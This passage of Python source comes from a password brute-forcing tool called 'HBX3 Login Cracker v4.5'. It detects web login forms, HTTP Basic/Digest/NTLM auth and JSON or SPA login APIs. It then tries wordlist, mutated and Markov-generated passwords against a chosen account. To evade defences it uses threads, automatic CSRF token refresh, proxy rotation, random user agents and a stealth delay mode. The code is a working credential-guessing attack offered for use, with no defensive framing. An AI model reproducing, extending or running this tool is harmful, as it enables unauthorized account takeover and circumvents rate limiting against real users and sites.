        auth_type = None
        if 'Basic' in auth_header:
            auth_type = 'basic'
        elif 'Digest' in auth_header:
            auth_type = 'digest'
        elif 'NTLM' in auth_header:
            auth_type = 'ntlm'
        else:
            return None

        form = DetectedForm(
            action=response.url,
            method="GET",
            auth_type=auth_type,
            framework=FrameworkType.UNKNOWN,
            confidence=0.9,
            extra_data={
                'auth_header': auth_header,
                'realm': re.search(r'realm="([^"]+)"', auth_header, re.I).group(1) if re.search(r'realm="([^"]+)"', auth_header, re.I) else '',
            },
        )
        logging.info(f"{C.green('✓ HTTP Auth detected:')} {C.cyan(auth_type)}")
        return form

    def _detect_json_api(self, response: requests.Response, url: str) -> Optional[DetectedForm]:
        """Detect JSON-based authentication API."""
        ct = response.headers.get('Content-Type', '').lower()
        if 'json' not in ct and url.endswith('.html'):
            return None

        text = response.text
        url_lower = url.lower()

        # Check URL patterns
        if not any(re.search(p, url_lower, re.I) for p in self.JSON_AUTH_PATTERNS):
            # Check body for JSON auth hints
            if not any(re.search(p, text, re.I) for p in self.JSON_AUTH_PATTERNS[:3]):
                return None

        form = DetectedForm(
            action=url,
            method="POST",
            auth_type="json",
            framework=FrameworkType.JSON_API,
            content_type="application/json",
            is_ajax=True,
            json_fields={"email": "", "password": ""},
            user_field="email",
            pass_field="password",
            confidence=0.7,
        )

        # Try to parse existing fields from JSON
        try:
            data = json.loads(text) if '{' in text else {}
            if isinstance(data, dict):
                if 'email' in data or 'username' in data:
                    form.user_field = 'email' if 'email' in data else 'username'
                if 'password' in data:
                    form.pass_field = 'password'
                # Look for CSRF in JSON
                for key in data:
                    if self.CSRF_PATTERNS.search(key):
                        form.csrf_field = key
                        form.csrf_token = str(data[key])
                        break
        except (json.JSONDecodeError, ValueError):
            pass

        return form

    def _parse_html_forms(self, html: str, base_url: str,
                          framework: FrameworkType) -> List[DetectedForm]:
        """Parse HTML forms and extract login forms."""
        forms = []
        soup = BeautifulSoup(html, 'html.parser' if not HAVE_LXML else 'lxml')

        for form_tag in soup.find_all('form'):
            # Skip non-login forms (search, comment, etc.)
            if not self._is_login_form(form_tag, html):
                continue

            action = form_tag.get('action', '')
            if not action:
                action = base_url
            else:
                action = urljoin(base_url, action)

            method = form_tag.get('method', 'post').upper()

            detected = DetectedForm(
                action=action,
                method=method,
                framework=framework,
                auth_type="form",
            )

            # Extract all input fields
            for inp in form_tag.find_all('input'):
                name = inp.get('name')
                if not name:
                    continue
                inp_type = inp.get('type', 'text').lower()
                value = inp.get('value', '')

                # Password field
                if inp_type == 'password' or self.PASS_PATTERNS.search(name):
                    detected.pass_field = name

                # Username/email field
                elif inp_type in ('email', 'text', 'tel', '') and \
                     self.USER_PATTERNS.search(name):
                    detected.user_field = name

                # CSRF token
                elif inp_type == 'hidden' and self.CSRF_PATTERNS.search(name):
                    detected.csrf_field = name
                    detected.csrf_token = value
                    detected.hidden[name] = value

                # Hidden fields
                elif inp_type == 'hidden':
                    detected.hidden[name] = value

                # Submit button
                elif inp_type == 'submit':
                    detected.submit_trigger = name

            # Check for CSRF in meta tags
            meta_csrf = soup.find('meta', attrs={
                'name': self.CSRF_META_PATTERNS
            })
            if meta_csrf and meta_csrf.get('content'):
                detected.csrf_meta = meta_csrf.get('name')
                if not detected.csrf_token:
                    detected.csrf_token = meta_csrf.get('content')

            # Check for CSRF in headers/scripts
            detected.extra_data['onsubmit'] = form_tag.get('onsubmit', '')

            # Check for AJAX form
            if form_tag.get('data-remote') or \
               form_tag.get('data-ajax') or \
               'ajax' in form_tag.get('class', []) or \
               'remote' in str(form_tag.get('data-type', '')):
                detected.is_ajax = True
                detected.content_type = 'application/json; charset=utf-8'
                detected.auth_type = 'ajax_form'

            forms.append(detected)

        # If no form found, try to find password inputs outside forms
        if not forms:
            password_inputs = soup.find_all('input', {'type': 'password'})
            if password_inputs:
                inp = password_inputs[0]
                detected = DetectedForm(
                    action=base_url,
                    method="POST",
                    framework=framework,
                    auth_type="form",
                    pass_field=inp.get('name', 'password'),
                )
                forms.append(detected)

        return forms

    def _is_login_form(self, form_tag, html: str) -> bool:
        """Determine if a form is a login form."""
        # Has password input?
        if form_tag.find('input', {'type': 'password'}):
            return True

        # ID/class contains login/signin?
        form_id = (form_tag.get('id') or '').lower()
        form_class = ' '.join(form_tag.get('class', []) or []).lower()

        login_indicators = [
            'login', 'signin', 'sign-in', 'log-in', 'auth',
            'authenticate', 'session', 'account',
        ]

        for indicator in login_indicators:
            if indicator in form_id or indicator in form_class:
                return True

        # Form action contains login?
        action = (form_tag.get('action') or '').lower()
        for indicator in login_indicators:
            if indicator in action:
                return True

        # Has username/email AND password fields?
        inputs = form_tag.find_all('input')
        has_user = False
        has_pass = False

        for inp in inputs:
            name = inp.get('name', '')
            inp_type = inp.get('type', 'text').lower()

            if inp_type == 'password' or self.PASS_PATTERNS.search(name):
                has_pass = True
            elif self.USER_PATTERNS.search(name):
                has_user = True

        if has_user and has_pass:
            return True

        # Minimum: at least 2 text-like inputs + submit
        text_inputs = [i for i in inputs 
                       if i.get('type', 'text') in ('text', 'email', '')]
        submit_buttons = form_tag.find_all(['input', 'button'], 
                                            {'type': ['submit', 'button']})
        if len(text_inputs) >= 2 and len(submit_buttons) >= 1:
            return True

        return False

    def _detect_spa_auth(self, html: str, base_url: str,
                         framework: FrameworkType) -> Optional[DetectedForm]:
        """Detect SPA (Single Page Application) authentication."""
        soup = BeautifulSoup(html, 'html.parser')

        # Check for root div with data-api or data-auth attributes
        root_div = soup.find('div', id=re.compile(r'root|app|main', re.I))
        if root_div:
            api_url = root_div.get('data-api') or root_div.get('data-auth-url')
            if api_url:
                return DetectedForm(
                    action=urljoin(base_url, api_url),
                    method="POST",
                    framework=framework,
                    auth_type="spa_api",
                    is_ajax=True,
                    content_type="application/json",
                    user_field="email",
                    pass_field="password",
                    json_fields={"email": "", "password": ""},
                    confidence=0.6,
                )

        # Check for __NEXT_DATA__ or __NUXT__ or __INITIAL_STATE__
        for script in soup.find_all('script'):
            if script.string:
                for pattern in ['__NEXT_DATA__', '__NUXT__', '__INITIAL_STATE__',
                                'window.__auth', 'window.apiUrl']:
                    if pattern in script.string:
                        # Extract auth URL if possible
                        match = re.search(r'"(https?://[^"]*login[^"]*)"', script.string)
                        if match:
                            return DetectedForm(
                                action=match.group(1),
                                method="POST",
                                framework=FrameworkType.CUSTOM,
                                auth_type="spa_auth",
                                is_ajax=True,
                                content_type="application/json",
                                confidence=0.5,
                            )

        return None

    def _score_form(self, form: DetectedForm, html: str,
                    response: requests.Response) -> float:
        """Score form detection confidence (0.0 - 1.0)."""
        score = 0.0

        # Has both user and password fields
        if form.user_field and form.pass_field:
            score += 0.3

        # Has CSRF protection (good sign of login form)
        if form.csrf_field or form.csrf_meta:
            score += 0.2

        # Action URL contains login indicators
        if re.search(r'login|signin|auth|token|session', form.action, re.I):
            score += 0.15

        # Framework detected
        if form.framework != FrameworkType.UNKNOWN:
            score += 0.1

        # Has hidden fields (typical of login forms)
        if form.hidden:
            score += 0.05

        # Method is POST
        if form.method == "POST":
            score += 0.05

        # HTTP auth detected
        if form.auth_type in ('basic', 'digest', 'ntlm'):
            score += 0.3

        # JSON API detected
        if form.auth_type == 'json':
            score += 0.2

        # AJAX/SPA form
        if form.is_ajax:
            score += 0.1

        return min(1.0, score)


# ═════════════════════════════════════════════════════════════════════════════
# ATTACK ENGINE
# ═════════════════════════════════════════════════════════════════════════════

class AuthMethod(Enum):
    FORM = "form"
    JSON = "json"
    BASIC = "basic"
    DIGEST = "digest"
    NTLM = "ntlm"
    BEARER = "bearer"
    OAUTH = "oauth"
    CUSTOM = "custom"


@dataclass
class AttemptResult:
    password: str
    success: bool
    confidence: float = 0.0
    status_code: int = 0
    response_time: float = 0.0
    matched_keywords: List[str] = field(default_factory=list)
    error: Optional[str] = None
    response_url: Optional[str] = None
    cookies: Optional[Dict] = None


class AttackEngine:
    """
    Core attack engine.
    Handles authentication attempts with multiple auth methods,
    concurrent execution, rate limiting, and result collection.
    """

    def __init__(self, target_url: str, username: str,
                 form: DetectedForm,
                 threads: int = 5,
                 delay: float = 1.0,
                 timeout: int = 20,
                 retries: int = 3,
                 stealth: bool = False,
                 proxy_manager: Optional[ProxyManager] = None,
                 user_agent_manager: Optional[UserAgentManager] = None,
                 detection_engine: Optional[DetectionEngine] = None,
                 rate_limiter: Optional[AdaptiveRateLimiter] = None):

        self.target_url = target_url
        self.username = username
        self.form = form
        self.threads = threads
        self.base_delay = delay
        self.timeout = timeout
        self.retries = retries
        self.stealth = stealth
        self.proxy_manager = proxy_manager
        self.ua_manager = user_agent_manager or UserAgentManager()
        self.detection = detection_engine or DetectionEngine()
        self.rate_limiter = rate_limiter or AdaptiveRateLimiter(base_delay=delay)

        self.session = requests.Session()
        self.result_lock = Lock()
        self.found = False
        self.found_password = None
        self.attempt_count = 0
        self.start_time = 0.0
        self.login_page_content = None
        self._csrf_semaphore = Semaphore(1)
        self._last_csrf_refresh = 0.0

    def prepare(self) -> bool:
        """Prepare for attack — fetch login page, refresh CSRF, etc."""
        logging.info(f"{C.cyan('▶ Preparing attack...')}")

        try:
            resp = self._make_request('GET', self.target_url)
            self.login_page_content = resp.text

            # Refresh CSRF token
            if self.form.csrf_field or self.form.csrf_meta:
                self._refresh_csrf(resp.text)

            logging.info(f"{C.green('✓ Ready:')} "
                         f"{C.cyan(self.form.auth_type)} auth "
                         f"→ {C.cyan(self.form.action)}")
            return True

        except Exception as e:
            logging.error(f"{C.red('✗ Prepare failed:')} {e}")
            return False

    def run(self, passwords: List[str]) -> AttackResult:
        """Run the attack with a list of passwords."""
        self.start_time = time.time()
        found_password = None

        # Filter already tried
        todo = [p for p in passwords if p not in getattr(self, '_tried', set())]

        if not todo:
            logging.warning(f"{C.yellow('⚠ No passwords to try (all already attempted).')}")
            return self._build_result(None, AttackStatus.DONE)

        # Progress tracker
        progress = ProgressTracker(len(todo), desc="Bruteforcing")

        # Thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            batch_size = max(1, len(todo) // (self.threads * 2))

            for batch_start in range(0, len(todo), batch_size):
                if self.found:
                    break

                batch = todo[batch_start:batch_start + batch_size]

                for pwd in batch:
                    if self.found:
                        break

                    # Rate limiting
                    self.rate_limiter.wait()

                    # CSRF refresh every 15 requests
                    if self.attempt_count % 15 == 0:
                        self._refresh_csrf_async()

                    # Submit
                    future = executor.submit(self._try_auth, pwd)
                    futures[future] = pwd

            # Collect results
            for future in as_completed(futures):
                if self.found:
                    break
                try:
                    result = future.result()
                    progress.update()
                    if result.success:
                        self.found = True
                        self.found_password = result.password
                        logging.info(
                            f"\n{C.green(C.bold('✓ FOUND!'))} "
                            f"{C.gold(result.password)}"
                        )
                        break
                except Exception as e:
                    logging.debug(f"{C.dim(f'Thread error: {e}')}")
                    progress.update()

        progress.finish()
        elapsed = time.time() - self.start_time

        return self._build_result(
            self.found_password or None,
            AttackStatus.FOUND if self.found else AttackStatus.DONE,
            elapsed
        )

    def _try_auth(self, password: str) -> AttemptResult:
        """Try a single password with the detected auth method."""
        start = time.time()

        try:
            if self.form.auth_type == 'json':
                return self._try_json_auth(password)
            elif self.form.auth_type == 'basic':
                return self._try_basic_auth(password)
            elif self.form.auth_type == 'digest':
                return self._try_digest_auth(password)
            elif self.form.auth_type == 'ntlm':
                return self._try_ntlm_auth(password)
            else:
                return self._try_form_auth(password)

        except requests.Timeout:
            return AttemptResult(
                password=password,
                success=False,
                error="Timeout",
                response_time=time.time() - start,
            )
        except Exception as e:
            return AttemptResult(
                password=password,
                success=False,
                error=str(e)[:100],
                response_time=time.time() - start,
            )

    def _try_form_auth(self, password: str) -> AttemptResult:
        """Standard form-based authentication."""
        start = time.time()

        # Build payload
        payload = self.form.to_payload(self.username, password)

        # Build headers
        headers = {
            'User-Agent': self.ua_manager.get_random(),
            'Content-Type': self.form.content_type,
            'Origin': self._get_origin(),
            'Referer': self.target_url,
        }

        # CSRF header if needed
        if self.form.csrf_header:
            headers[self.form.csrf_header] = self.form.csrf_token or ''

        # Execute
        try:
            if self.form.method == 'GET':
                resp = self._make_request('GET', self.form.action,
                                          params=payload, headers=headers,
                                          allow_redirects=True)
            else:
                resp = self._make_request('POST', self.form.action,
                                          data=payload, headers=headers,
                                          allow_redirects=True)

            # Update rate limiter
            self.rate_limiter.report_ok() if resp.status_code < 400 else \
                self.rate_limiter.report_fail(resp.status_code)

            # Analyze
            with self.result_lock:
                self.attempt_count += 1

            is_success, confidence, keywords = self.detection.analyze(
                resp, self.login_page_content
            )

            return AttemptResult(
                password=password,
                success=is_success,
                confidence=confidence,
                status_code=resp.status_code,
                response_time=time.time() - start,
                matched_keywords=keywords,
                response_url=resp.url,
                cookies=dict(resp.cookies),
            )

        except requests.exceptions.RequestException as e:
            return AttemptResult(
                password=password,
                success=False,
                error=str(e)[:100],
                status_code=0,
                response_time=time.time() - start,
            )

    def _try_json_auth(self, password: str) -> AttemptResult:
        """JSON API authentication."""
        start = time.time()

        payload = self.form.to_json_payload(self.username, password)

        headers = {
            'User-Agent': self.ua_manager.get_random(),
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': self._get_origin(),
            'Referer': self.target_url,
        }

        if self.form.csrf_header:
            headers[self.form.csrf_header] = self.form.csrf_token or ''

        try:
            resp = self._make_request('POST', self.form.action,
                                      json=payload, headers=headers,
                                      allow_redirects=True)

            self.rate_limiter.report_ok() if resp.status_code < 400 else \
                self.rate_limiter.report_fail(resp.status_code)

            with self.result_lock:
                self.attempt_count += 1

            # Parse JSON response
            is_success = False
            confidence = 0.0
            keywords = []

            try:
                data = resp.json()
                if data.get('success') or data.get('status') in ('ok', 'success'):
                    is_success = True
                    confidence = 0.9
                    keywords.append("json_success")
                elif data.get('error'):
                    is_success = False
                    keywords.append(f"json_error: {str(data.get('error'))[:30]}")
                elif data.get('token') or data.get('access_token'):
                    is_success = True
                    confidence = 0.95
                    keywords.append("token_received")
                elif data.get('message'):
                    msg = str(data.get('message', '')).lower()
                    if any(w in msg for w in ['invalid', 'wrong', 'failed']):
                        is_success = False
                        keywords.append(f"json_msg: {msg[:30]}")
                    else:
                        is_success = True
                        keywords.append(f"json_msg: {msg[:30]}")
            except (json.JSONDecodeError, ValueError):
                # Fall back to text analysis
                is_success, confidence, keywords = self.detection.analyze(
                    resp, self.login_page_content
                )

            return AttemptResult(
                password=password,
                success=is_success,
                confidence=confidence,
                status_code=resp.status_code,
                response_time=time.time() - start,
                matched_keywords=keywords,
                response_url=resp.url,
                cookies=dict(resp.cookies),
            )

        except Exception as e:
            return AttemptResult(
                password=password,
                success=False,
                error=str(e)[:100],
                response_time=time.time() - start,
            )

    def _try_basic_auth(self, password: str) -> AttemptResult:
        """HTTP Basic authentication."""
        start = time.time()

        headers = {'User-Agent': self.ua_manager.get_random()}

        try:
            resp = self._make_request(
                'GET', self.form.action,
                headers=headers,
                auth=(self.username, password),
                allow_redirects=True,
            )

            with self.result_lock:
                self.attempt_count += 1

            is_success = resp.status_code == 200
            confidence = 0.8 if is_success else 0.0

            return AttemptResult(
                password=password,
                success=is_success,
                confidence=confidence,
                status_code=resp.status_code,
                response_time=time.time() - start,
                response_url=resp.url,
            )

        except Exception as e:
            return AttemptResult(
                password=password,
                success=False,
                error=str(e)[:100],
                response_time=time.time() - start,
            )

    def _try_digest_auth(self, password: str) -> AttemptResult:
        """HTTP Digest authentication."""
        from requests.auth import HTTPDigestAuth
        start = time.time()

        headers = {'User-Agent': self.ua_manager.get_random()}

        try:
            resp = self._make_request(
                'GET', self.form.action,
                headers=headers,
                auth=HTTPDigestAuth(self.username, password),
                allow_redirects=True,
            )

            with self.result_lock:
                self.attempt_count += 1

            is_success = resp.status_code == 200
            confidence = 0.8 if is_success else 0.0

            return AttemptResult(
                password=password,
                success=is_success,
                confidence=confidence,
                status_code=resp.status_code,
                response_time=time.time() - start,
                response_url=resp.url,
            )

        except Exception as e:
            return AttemptResult(
                password=password,
                success=False,
                error=str(e)[:100],
                response_time=time.time() - start,
            )

    def _try_ntlm_auth(self, password: str) -> AttemptResult:
        """NTLM authentication."""
        start = time.time()

        headers = {'User-Agent': self.ua_manager.get_random()}

        try:
            if HAVE_NTLM:
                auth = HttpNtlmAuth(self.username, password)
                resp = self._make_request(
                    'GET', self.form.action,
                    headers=headers,
                    auth=auth,
                    allow_redirects=True,
                )
            else:
                return AttemptResult(
                    password=password,
                    success=False,
                    error="NTLM support not installed (pip install requests_ntlm)",
                    response_time=time.time() - start,
                )

            with self.result_lock:
                self.attempt_count += 1

            is_success = resp.status_code == 200
            confidence = 0.8 if is_success else 0.0

            return AttemptResult(
                password=password,
                success=is_success,
                confidence=confidence,
                status_code=resp.status_code,
                response_time=time.time() - start,
                response_url=resp.url,
            )

        except Exception as e:
            return AttemptResult(
                password=password,
                success=False,
                error=str(e)[:100],
                response_time=time.time() - start,
            )

    def _make_request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make request with retries, proxy, and timeout."""
        kwargs.setdefault('timeout', self.timeout)

        # Add proxy if available
        if self.proxy_manager and self.proxy_manager.has_proxies:
            proxy_dict = self.proxy_manager.get_proxy_dict()
            if proxy_dict:
                kwargs['proxies'] = proxy_dict

        # Stealth mode: add jitter
        if self.stealth:
            jitter = random.uniform(0.5, 3.0)
            time.sleep(jitter)

        # Retry logic
        for attempt in range(self.retries):
            try:
                return self.session.request(method, url, **kwargs)
            except (requests.ConnectionError, requests.Timeout,
                    requests.ProxyError) as e:
                if attempt < self.retries - 1:
                    wait = (2 ** attempt) + random.uniform(0, 1)
                    logging.debug(f"{C.yellow(f'Retry {attempt+1}/{self.retries}: {e}')}")
                    time.sleep(wait)
                    # Rotate proxy on retry
                    if self.proxy_manager:
                        new_proxy = self.proxy_manager.get_proxy_dict()
                        if new_proxy:
                            kwargs['proxies'] = new_proxy
                else:
                    raise

        # Shouldn't reach here normally
        raise ConnectionError(f"All {self.retries} retries failed")

    def _refresh_csrf(self, html: str = None):
        """Refresh CSRF token from page."""
        if not html:
            try:
                resp = self._make_request('GET', self.target_url)
                html = resp.text
            except Exception:
                return

        if HAVE_BS4:
            soup = BeautifulSoup(html, 'html.parser')

            # From meta tag
            meta = soup.find('meta', attrs={
                'name': re.compile(r'csrf-token|csrf|_csrf', re.I)
            })
            if meta and meta.get('content'):
                self.form.csrf_token = meta['content']
                return

            # From input field
            if self.form.csrf_field:
                inp = soup.find('input', {'name': self.form.csrf_field})
                if inp and inp.get('value'):
                    self.form.csrf_token = inp['value']
                    return

            # From script data
            for script in soup.find_all('script'):
                if script.string:
                    match = re.search(
                        r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        script.string, re.I
                    )
                    if match:
                        self.form.csrf_token = match.group(1)
                        return

    def _refresh_csrf_async(self):
        """Refresh CSRF in a background thread."""
        Thread(target=self._refresh_csrf, daemon=True).start()

    def _get_origin(self) -> str:
        """Extract origin from target URL."""
        parsed = urlparse(self.target_url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def _build_result(self, password: Optional[str],
                      status: 'AttackStatus',
                      elapsed: float = 0.0) -> 'AttackResult':
        """Build final attack result."""
        return AttackResult(
            target=self.target_url,
            user=self.username,
            password=password,
            attempts=self.attempt_count,
            elapsed=elapsed,
            status=status,
            timestamp=datetime.now().isoformat(),
        )


# ═════════════════════════════════════════════════════════════════════════════
# RESULT / REPORT
# ═════════════════════════════════════════════════════════════════════════════

class AttackStatus(Enum):
    IDLE = "idle"
    RUNNING = "running"
    FOUND = "found"
    DONE = "done"
    FAIL = "fail"
    CANCELLED = "cancelled"


@dataclass
class AttackResult:
    target: str
    user: str
    password: Optional[str] = None
    attempts: int = 0
    elapsed: float = 0.0
    status: AttackStatus = AttackStatus.IDLE
    speed: float = 0.0
    timestamp: str = ""
    form_type: str = ""
    framework: str = ""
    matched_keywords: List[str] = field(default_factory=list)
    cookies: Optional[Dict] = None
    jwt_decoded: Optional[Dict] = None

    def __post_init__(self):
        if self.elapsed > 0 and self.attempts > 0:
            self.speed = self.attempts / self.elapsed

    def to_dict(self) -> Dict:
        return asdict(self)

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), indent=indent, default=str)

    def print_summary(self):
        """Print a beautiful summary of the attack result."""
        print(f"""
{C.bold(C.cyan('═' * 70))}
{C.bold(C.green('╔══════════════════════════════════════════════════════════════╗'))}
{C.bold(C.green('║                    ATTACK COMPLETE                          ║'))}
{C.bold(C.green('╚══════════════════════════════════════════════════════════════╝'))}
{C.bold(C.cyan('═' * 70))}

  {C.bold('Target')}    : {C.cyan(self.target)}
  {C.bold('User')}      : {C.yellow(self.user)}
  {C.bold('Status')}    : {C.green(self.status.value) if self.status == AttackStatus.FOUND else C.red(self.status.value)}
  {C.bold('Attempts')}  : {C.magenta(str(self.attempts))}
  {C.bold('Time')}      : {C.magenta(f'{self.elapsed:.2f}s')}
  {C.bold('Speed')}     : {C.magenta(f'{self.speed:.1f} pwd/s')}

{C.bold(C.cyan('═' * 70))}
        """)

        if self.password:
            print(f"""
{C.bold(C.green('╔══════════════════════════════════════════════════════════════╗'))}
{C.bold(C.green('║                    ✅  PASSWORD FOUND                        ║'))}
{C.bold(C.green('╠══════════════════════════════════════════════════════════════╣'))}
{C.bold(C.green('║'))}                                                          {C.bold(C.green('║'))}
{C.bold(C.green('║'))}   {C.bold('Password')} : {C.gold(C.bold(self.password))}{' ' * (55 - len(self.password))} {C.bold(C.green('║'))}
{C.bold(C.green('║'))}   {C.bold('Keywords')} : {C.pink(', '.join(self.matched_keywords[:5]))}  {C.bold(C.green('║'))}
{C.bold(C.green('║'))}                                                          {C.bold(C.green('║'))}
{C.bold(C.green('╚══════════════════════════════════════════════════════════════╝'))}
{C.bold(C.cyan('═' * 70))}
            """)

            if self.jwt_decoded:
                print(f"\n{C.bold(C.magenta('JWT Decoded Payload:'))}")
                for k, v in self.jwt_decoded.items():
                    if k.lower() not in ('password', 'secret', 'key', 'pass'):
                        print(f"  {C.cyan(k)}: {C.white(str(v))}")


class ReportGenerator:
    """Generate reports in multiple formats."""

    @staticmethod
    def save_json(result: AttackResult, filepath: str = "hbx3_report.json"):
        with open(filepath, 'w') as f:
            json.dump(result.to_dict(), f, indent=2, default=str)
        logging.info(f"{C.green('✓ JSON report:')} {C.cyan(filepath)}")

    @staticmethod
    def save_csv(result: AttackResult, filepath: str = "hbx3_results.csv"):
        exists = os.path.exists(filepath)
        with open(filepath, 'a', newline='') as f:
            writer = csv.writer(f)
            if not exists:
                writer.writerow([
                    'Target', 'User', 'Password', 'Status', 'Attempts',
                    'Time(s)', 'Speed(pwd/s)', 'Keywords', 'Timestamp'
                ])
            writer.writerow([
                result.target, result.user, result.password or '',
                result.status.value, result.attempts,
                f'{result.elapsed:.2f}', f'{result.speed:.1f}',
                '; '.join(result.matched_keywords[:5]),
                result.timestamp,
            ])
        logging.info(f"{C.green('✓ CSV report:')} {C.cyan(filepath)}")

    @staticmethod
    def save_txt(result: AttackResult, filepath: str = "hbx3_result.txt"):
        with open(filepath, 'w') as f:
            f.write(f"HBX3 Login Cracker v4.5 - Attack Result\n")
            f.write(f"{'=' * 60}\n")
            f.write(f"Target   : {result.target}\n")
            f.write(f"User     : {result.user}\n")
            f.write(f"Password : {result.password or 'NOT FOUND'}\n")
            f.write(f"Status   : {result.status.value}\n")
            f.write(f"Attempts : {result.attempts}\n")
            f.write(f"Time     : {result.elapsed:.2f}s\n")
            f.write(f"Speed    : {result.speed:.1f} pwd/s\n")
            f.write(f"Keywords : {', '.join(result.matched_keywords[:5])}\n")
            f.write(f"Timestamp: {result.timestamp}\n")
        logging.info(f"{C.green('✓ TXT report:')} {C.cyan(filepath)}")

    @staticmethod
    def save_all(result: AttackResult, base_name: str = "hbx3_report"):
        ReportGenerator.save_json(result, f"{base_name}.json")
        ReportGenerator.save_csv(result, f"{base_name}.csv")
        ReportGenerator.save_txt(result, f"{base_name}.txt")


# ═════════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═════════════════════════════════════════════════════════════════════════════

class HBX3Cracker:
    """
    Main application class.
    Orchestrates form detection, attack execution, and reporting.
    """

    def __init__(self, interactive: bool = False):
        self.interactive = interactive
        self.config = {
            'url': '',
            'email': '',
            'wordlist': '',
            'threads': 5,
            'delay': 1.0,
            'stealth': False,
            'mutate': False,
            'markov': False,
            'proxy_file': '',
            'output': '',
            'resume': '',
            'debug': False,
        }
        self.form: Optional[DetectedForm] = None
        self.proxy_manager: Optional[ProxyManager] = None
        self.wordlist_manager: Optional[WordlistManager] = None
        self.result: Optional[AttackResult] = None

    def setup_logging(self):
        """Setup colorful logging."""
        logger = logging.getLogger()
        logger.setLevel(logging.DEBUG if self.config['debug'] else logging.INFO)
        handler = ColoredLogHandler()
        logger.handlers = [handler]

    def parse_args(self):
        """Parse CLI arguments or run interactive."""
        if self.interactive or len(sys.argv) <= 1:
            self._interactive_setup()
        else:
            self._cli_setup()

    def _cli_setup(self):
        """Parse CLI arguments."""
        parser = argparse.ArgumentParser(
            description=f"HBX3 Login Cracker v4.5",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  python hbx3.py -u https://example.com/login -e admin@example.com -w passwords.txt
  python hbx3.py -u https://example.com -e admin@example.com -w list.txt -t 10 --stealth --mutate
  python hbx3.py -u https://api.example.com/auth -e admin@example.com -w list.txt
            """,
        )

        parser.add_argument('-u', '--url', required=True, help='Target URL')
        parser.add_argument('-e', '--email', required=True, help='Username/Email')
        parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file')

        parser.add_argument('-t', '--threads', type=int, default=5, help='Threads [5]')
        parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay [1.0s]')

        parser.add_argument('-p', '--proxy-file', help='Proxy file')
        parser.add_argument('--stealth', action='store_true', help='Stealth mode')
        parser.add_argument('--mutate', action='store_true', help='Password mutation')
        parser.add_argument('--markov', action='store_true', help='Markov generation')

        parser.add_argument('-o', '--output', help='Output report file')
        parser.add_argument('--resume', help='Resume file')
        parser.add_argument('--debug', action='store_true', help='Debug mode')

        args = parser.parse_args()

        self.config['url'] = args.url
        self.config['email'] = args.email
        self.config['wordlist'] = args.wordlist
        self.config['threads'] = args.threads
        self.config['delay'] = args.delay
        self.config['stealth'] = args.stealth
        self.config['mutate'] = args.mutate
        self.config['markov'] = args.markov
        self.config['proxy_file'] = args.proxy_file or ''
        self.config['output'] = args.output or ''
        self.config['resume'] = args.resume or ''
        self.config['debug'] = args.debug

    def _interactive_setup(self):
        """Run interactive setup."""
        C.print_banner()
        print()
        print(f"{C.bold(C.magenta('═' * 60))}")
        print(f"{C.bold(C.magenta('          INTERACTIVE SETUP'))}")
        print(f"{C.bold(C.magenta('═' * 60))}")
        print()

        self.config['url'] = input(f"  {C.green('Target URL')} {C.dim('(ex: https://example.com/login)')}\n  {C.bold('> ')}").strip()
        if not self.config['url']:
            print(f"{C.red('✗ URL is required')}")
            sys.exit(1)

        self.config['email'] = input(f"\n  {C.green('Username/Email')}\n  {C.bold('> ')}").strip()
        if not self.config['email']:
            print(f"{C.red('✗ Email is required')}")
            sys.exit(1)

        self.config['wordlist'] = input(f"\n  {C.green('Wordlist file')} {C.dim('(ex: passwords.txt)')}\n  {C.bold('> ')}").strip()
        if not self.config['wordlist']:
            print(f"{C.red('✗ Wordlist is required')}")
            sys.exit(1)
        if not os.path.exists(self.config['wordlist']):
            print(f"{C.red(f'✗ File not found: {self.config["wordlist"]}')}")
            sys.exit(1)

        threads_inp = input(f"\n  {C.yellow('Threads')} {C.dim('[5]')}: ")
        self.config['threads'] = int(threads_inp) if threads_inp.strip().isdigit() else 5

        delay_inp = input(f"  {C.yellow('Delay (seconds)')} {C.dim('[1.0]')}: ")
        self.config['delay'] = float(delay_inp) if delay_inp.strip() else 1.0

        stealth_inp = input(f"\n  {C.yellow('Stealth mode?')} {C.dim('(y/N)')}: ").lower()
        self.config['stealth'] = stealth_inp in ('y', 'yes')

        mutate_inp = input(f"  {C.yellow('Password mutation?')} {C.dim('(y/N)')}: ").lower()
        self.config['mutate'] = mutate_inp in ('y', 'yes')

        markov_inp = input(f"  {C.yellow('Markov generation?')} {C.dim('(y/N)')}: ").lower()
        self.config['markov'] = markov_inp in ('y', 'yes')

        proxy_inp = input(f"\n  {C.yellow('Proxy file')} {C.dim('(optional)')}: ")
        self.config['proxy_file'] = proxy_inp.strip()

        print()
        print(f"{C.bold(C.green('═' * 60))}")
        print()

    def load_wordlist(self) -> List[str]:
        """Load and process wordlist."""
        logging.info(f"{C.cyan('▶ Loading wordlist...')}")

        manager = WordlistManager(shuffle=False)
        count = manager.load_file(self.config['wordlist'])
        logging.info(f"  {C.green('✓')} {count} passwords loaded")

        if self.config['mutate']:
            logging.info(f"{C.cyan('  ▶ Applying mutation...')}")
            mutation = MutationEngine(max_variants=5)
            new = manager.apply_mutation(mutation, max_variants=5)
            logging.info(f"  {C.green('✓')} {new} mutations generated")

        if self.config['markov']:
            logging.info(f"{C.cyan('  ▶ Generating Markov passwords...')}")
            markov = MarkovGenerator(order=2)
            markov.train(manager.words)
            new = manager.generate_markov(markov, count=50)
            logging.info(f"  {C.green('✓')} {new} Markov passwords generated")

        self.wordlist_manager = manager
        return manager.words

    def load_proxies(self) -> Optional[ProxyManager]:
        """Load proxy manager."""
        if not self.config['proxy_file']:
            return None

        logging.info(f"{C.cyan('▶ Loading proxies...')}")
        manager = ProxyManager.from_file(self.config['proxy_file'])
        if manager.has_proxies:
            logging.info(f"  {C.green('✓')} {manager.count} proxies loaded")
        else:
            logging.warning(f"  {C.yellow('⚠ No valid proxies found')}")
        return manager

    def run(self) -> AttackResult:
        """Run the complete attack pipeline."""
